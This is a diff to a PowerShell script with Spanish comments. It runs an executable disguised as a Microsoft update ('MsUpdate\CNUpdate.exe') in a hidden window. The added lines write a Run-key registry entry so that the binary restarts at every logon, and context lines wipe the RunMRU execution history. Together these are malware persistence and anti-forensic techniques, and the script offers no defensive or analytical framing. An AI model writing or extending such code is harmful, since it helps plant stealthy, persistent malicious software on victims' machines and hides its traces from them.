@@ -39,6 +39,21 @@ sleep 10
 Start-Process -FilePath "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\CNUpdate.exe" -ArgumentList "Documento.doc" -WindowStyle Hidden
 
 sleep 30
+
+# Ruta del registro para las entradas de inicio
+$rutaRegistro = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$nombreEntrada = "MsUpdate"
+
+# Verificar si la entrada ya existe
+if (-not (Test-Path "$rutaRegistro\$nombreEntrada")) {
+    # Ruta del ejecutable y el parámetro (Documento.doc)
+    $valorEntrada = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\CNUpdate.exe `"$env:UserProfile\Documents\Documento.doc`""
+    
+    # Crear la entrada en el registro
+    $null = New-ItemProperty -Path $rutaRegistro -Name $nombreEntrada -Value $valorEntrada -PropertyType String -Force
+}
+
+
 # Limpiar historial de ejecucion
 $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
 Remove-Item -LiteralPath $registryPath -Force
